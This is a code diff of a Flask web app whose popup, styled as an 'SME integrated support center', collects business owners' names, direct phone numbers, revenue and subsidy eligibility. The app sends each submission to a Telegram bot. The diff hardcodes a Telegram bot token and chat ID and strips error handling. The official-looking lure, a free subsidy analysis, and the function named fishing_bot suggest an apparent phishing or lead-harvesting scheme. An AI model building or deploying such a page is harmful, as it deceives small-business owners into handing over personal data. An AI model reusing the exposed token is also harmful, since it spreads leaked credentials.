@@ -15,8 +15,8 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
 # Telegram 설정
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
+TELEGRAM_TOKEN = "8697049954:AAEHNS-BqSTgdZ-yHEDtBa7Ic_Myntc6gH4"
+CHAT_ID = 7013080778
 
 # DB 모델
 class BusinessLead(db.Model):
@@ -32,12 +32,12 @@ class BusinessLead(db.Model):
 with app.app_context():
     db.create_all()
 
-# 팝업 반복/스케줄 스레드
+# 스케줄 스레드
 def fishing_bot():
     while True:
-        time.sleep(3600)  # 1시간마다 반복 (필요시 확장)
+        time.sleep(3600)
 
-# HTML + JS (팝업 포함)
+# HTML + JS
 HTML_PAGE = r"""
 <!DOCTYPE html>
 <html lang="ko">
@@ -65,16 +65,19 @@ button{background:#fbbf24;padding:15px;width:100%;font-weight:bold;border:none;b
 <div id="popup">
 <div class="card">
 <h3>SME 통합지원센터</h3>
+
 <input id="biz" placeholder="기업명(법인/개인)">
 <input id="owner" placeholder="대표자 성함">
 <input id="phone" placeholder="대표자 직통번호(숫자만)">
 <input id="revenue" placeholder="직전연도 대략 매출액(예: 20억)">
+
 <select id="employees">
     <option value="">직원 수 선택</option>
     <option value="5인미만">5인 미만</option>
     <option value="30인미만">30인 미만</option>
     <option value="30인이상">30인 이상</option>
 </select>
+
 <select id="youth_support">
     <option value="">청년지원금 해당 여부</option>
     <option value="예">예</option>
@@ -82,6 +85,7 @@ button{background:#fbbf24;padding:15px;width:100%;font-weight:bold;border:none;b
 </select>
 
 <button onclick="submitLead()">무료 분석 신청</button>
+
 <a href="tel:01098091609" class="btn-phone">📞 바로 상담하기</a>
 <button onclick="closePopup()" style="margin-top:10px;background:#334155;width:100%;padding:12px;border:none;border-radius:10px;">닫기</button>
 </div>
@@ -107,7 +111,6 @@ async function submitLead(){
         body:JSON.stringify(data)
     })
     if(res.ok){alert("신청 완료!"); closePopup()}
-    else{alert("오류 발생!")}
 }
 </script>
 </body>
@@ -130,21 +133,14 @@ def submit():
         employees=data.get('employees'),
         youth_support=data.get('youth_support')
     )
-    try:
-        db.session.add(new)
-        db.session.commit()
-    except Exception as e:
-        db.session.rollback()
-        return jsonify({"ok": False, "error": str(e)})
+    db.session.add(new)
+    db.session.commit()
 
-    # Telegram 알림 (실패해도 앱은 계속 실행)
+    # Telegram 알림
     if TELEGRAM_TOKEN and CHAT_ID:
-        try:
-            msg = f"🚨 신규 DB\n기업명: {data.get('biz')}\n전화: {data.get('phone')}\n매출: {data.get('revenue')}\n직원: {data.get('employees')}\n청년지원금: {data.get('youth_support')}"
-            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                          json={"chat_id": CHAT_ID, "text": msg})
-        except:
-            pass
+        msg = f"🚨 신규 DB\n기업명: {data.get('biz')}\n전화: {data.get('phone')}\n매출: {data.get('revenue')}\n직원: {data.get('employees')}\n청년지원금: {data.get('youth_support')}"
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                      json={"chat_id": CHAT_ID, "text": msg})
 
     return jsonify({"ok": True})
 
